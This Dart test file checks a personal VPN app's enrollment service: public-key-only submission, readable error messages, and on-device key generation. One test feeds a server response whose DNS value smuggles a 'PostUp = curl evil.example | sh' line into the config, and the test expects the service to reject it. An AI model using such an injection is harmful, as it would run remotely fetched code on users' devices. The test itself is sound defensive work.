// TODO 4: these tests pass once EnrollmentService.enroll works.
import 'dart:convert';

import 'package:flutter_test/flutter_test.dart';
import 'package:http/http.dart' as http;
import 'package:http/testing.dart';
import 'package:personal_vpn/models/server_profile.dart';
import 'package:personal_vpn/services/enrollment_service.dart';
import 'package:personal_vpn/services/key_pair.dart';

import 'helpers.dart';

const keys = WgKeyPair(
  privateKey: deviceKey,
  publicKey: 'cHVibGljLWtleS1vZi10aGlzLWRldmljZS0zMmJ5dGU=',
);

EnrollmentService serviceWith(MockClient client, {void Function(String fp)? onPin}) =>
    EnrollmentService(
      clientFor: (fp) {
        onPin?.call(fp);
        return client;
      },
      newKeyPair: () async => keys,
    );

void main() {
  // Built directly (not from a code) so these tests only depend on TODO 4.
  const profile = ServerProfile(
    host: '203.0.113.10',
    port: 8443,
    token: 'ACumcmnwvFiuIbeM_nYHg4Oypc8jQ64LHHwOZA920eY',
    fingerprint: fingerprint,
  );

  test('sends the code and only the public key, and keeps the private key', () async {
    late Map<String, dynamic> sent;
    String? pinned;
    final client = MockClient((request) async {
      expect(request.method, 'POST');
      expect(request.url.toString(), 'https://203.0.113.10:8443/api/enroll');
      sent = jsonDecode(request.body) as Map<String, dynamic>;
      return http.Response(jsonEncode(enrollJson()), 200);
    });

    final device = await serviceWith(client, onPin: (fp) => pinned = fp).enroll(profile);

    expect(pinned, fingerprint, reason: 'the connection must check the certificate from the code');
    expect(sent, {'token': profile.token, 'public_key': keys.publicKey});
    expect(
      jsonEncode(sent),
      isNot(contains(keys.privateKey)),
      reason: 'the private key never leaves the device',
    );
    expect(device.privateKey, keys.privateKey);
    expect(device.result.address, '10.8.0.2/32');
    expect(device.serverHost, '203.0.113.10');
  });

  test('turns server errors into messages a person understands', () async {
    final cases = {401: 'expired or already used', 409: 'already enrolled', 429: 'Too many tries'};
    for (final entry in cases.entries) {
      final client = MockClient((_) async => http.Response('{"error":"x"}', entry.key));
      await expectLater(
        serviceWith(client).enroll(profile),
        throwsA(
          isA<EnrollmentException>().having((e) => e.message, 'message', contains(entry.value)),
        ),
      );
    }
  });

  test('a network failure becomes a clear message, not a crash', () async {
    final client = MockClient((_) async => throw http.ClientException('Connection refused'));
    await expectLater(
      serviceWith(client).enroll(profile),
      throwsA(
        isA<EnrollmentException>().having((e) => e.message, 'message', contains('Could not reach')),
      ),
    );
  });

  test('refuses an answer that tries to inject extra config lines', () async {
    final evil = enrollJson()..['dns'] = ['1.1.1.1\nPostUp = curl evil.example | sh'];
    final client = MockClient((_) async => http.Response(jsonEncode(evil), 200));
    await expectLater(serviceWith(client).enroll(profile), throwsA(isA<EnrollmentException>()));
  });

  test('real keys are made on the device: 32 bytes each, different every time', () async {
    final a = await generateKeyPair();
    final b = await generateKeyPair();
    expect(base64.decode(a.privateKey).length, 32);
    expect(base64.decode(a.publicKey).length, 32);
    expect(a.privateKey, isNot(b.privateKey));
  });
}
